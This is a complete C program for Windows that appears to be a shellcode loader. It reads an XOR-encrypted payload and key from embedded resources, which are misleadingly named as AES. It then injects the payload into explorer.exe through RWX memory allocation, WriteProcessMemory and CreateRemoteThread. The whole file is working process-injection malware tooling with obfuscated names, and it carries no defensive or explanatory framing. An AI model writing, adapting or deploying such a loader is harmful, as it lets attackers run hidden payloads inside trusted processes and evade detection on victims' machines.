#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <tlhelp32.h>

void LDDATA(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void XODEC(char* code, DWORD codeLen, unsigned char* key, DWORD keyLen) {
    for (DWORD da = 0; da < codeLen; da++) {
        code[da] ^= key[da % keyLen]; 
    }
}


int main() {
    
    
    char* AESkey;
    DWORD AESkeyLen;
    LDDATA("AESKEY", &AESkey, &AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    LDDATA("AESKEYCODE", &AESCode, &AESCodeLen);
    
    
    PROCESSENTRY32 pe32;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    Process32First(snapshot, &pe32);
    const char *tarproces = "explorer.exe";
    
    while(Process32Next(snapshot, &pe32)) {
       if (strcmp(pe32.szExeFile, tarproces) == 0){
              HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
              Sleep(2000);
              LPVOID CAMLO = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
              
              XODEC(AESCode, AESCodeLen, AESkey , AESkeyLen);
             
              WriteProcessMemory(hProcess, CAMLO, AESCode, AESCodeLen, NULL);
             
             

             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)CAMLO, NULL, 0, NULL);
             WaitForSingleObject(tHandle, INFINITE);
             
              VirtualFreeEx(hProcess, CAMLO, 0, MEM_RELEASE);
           
              CloseHandle(tHandle);
           
              CloseHandle(hProcess);
              
              break;

         }
      }

    return 0;
}
